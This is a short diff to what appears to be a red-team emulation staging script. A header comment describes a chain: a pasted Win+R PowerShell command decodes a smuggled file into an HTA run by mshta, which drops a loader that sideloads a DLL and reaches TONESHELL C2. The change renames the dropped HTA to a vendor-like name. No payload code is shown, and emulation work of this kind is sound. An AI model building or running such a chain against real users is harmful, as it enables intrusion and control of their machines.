@@ -8,7 +8,7 @@ Chain:
         -> the user pastes the Win+R command; powershell.exe reads the file,
            base64-decodes it to %TEMP%\\Essos_Compliance_Update.bin, renames it
            to .hta and runs it with mshta.exe
-    Essos_Compliance_Update.hta   (executed by mshta.exe)
+    hpsolutionsportal.hta   (executed by mshta.exe)
         -> drops EssosUpdate.exe + wsdapi.dll to %TEMP% and runs the loader
     EssosUpdate.exe -> wsdapi.dll sideload -> TONESHELL C2 (unchanged Step 1 chain)
 
@@ -47,7 +47,7 @@ HTML_OUT = os.path.join(HERE, "staging.html")
 
 SMUGGLED_NAME = "Essos_Compliance_Update.cer"
 BIN_NAME      = "Essos_Compliance_Update.bin"
-DROP_NAME     = "Essos_Compliance_Update.hta"
+DROP_NAME     = "hpsolutionsportal.hta"
 
 PEM_HEADER = "-----BEGIN CERTIFICATE-----"
 PEM_FOOTER = "-----END CERTIFICATE-----"
